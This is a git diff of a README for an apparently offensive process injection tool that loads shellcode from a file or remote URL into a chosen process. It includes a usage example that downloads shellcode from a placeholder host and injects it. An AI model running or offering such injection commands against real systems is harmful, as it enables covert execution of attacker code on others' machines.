@@ -7,7 +7,7 @@ This fork of process injection allows for dynamically pulling shellcode (in bin 
 ```
 Usage: ProcessInjection.exe <pid|self> <binlocation> <bintype>");
     Example: ProcessInjection.exe self http://x.x.x.x/app.b64 b64");
-    Example: ProcessInjection.exe 1000 C:\\Temp\\app.bin bin");
+    Example: ProcessInjection.exe 1000 C:\Temp\app.bin bin");
 ```
 Supported targets: Primarily, you'll want to target a process via the PID. However, it is possible to just inject into the ProcessInjection.exe process itself by using the value "self".
 Supported bintypes: "b64" for base64 encoded ShellCode and "bin" for raw/binary ShellCode.
